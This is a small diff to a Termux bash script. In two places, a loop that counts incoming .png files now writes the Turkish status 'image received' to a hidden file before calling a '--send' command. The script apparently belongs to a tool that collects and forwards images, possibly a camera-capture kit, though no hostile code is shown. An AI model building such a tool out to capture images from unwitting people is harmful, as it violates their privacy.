@@ -84,7 +84,7 @@ do
 	control=$(ls |grep .png |wc -l)
 	if [[ $control -gt 0 ]];then
 		clear
-		touch image
+		echo "[✓] RESİM ALINDI" > .info
 		termuxxtoolssmod --send
 		echo
 		echo
@@ -110,7 +110,7 @@ do
 	if [[ $control1 != $kontrol2 ]];then
 		echo -e "$(ls |grep .png |wc -l)" > .sayi.txt
 		clear
-		touch image
+		echo "[✓] RESİM ALINDI" > .info
 		termuxxtoolssmod --send
 		echo
 		echo
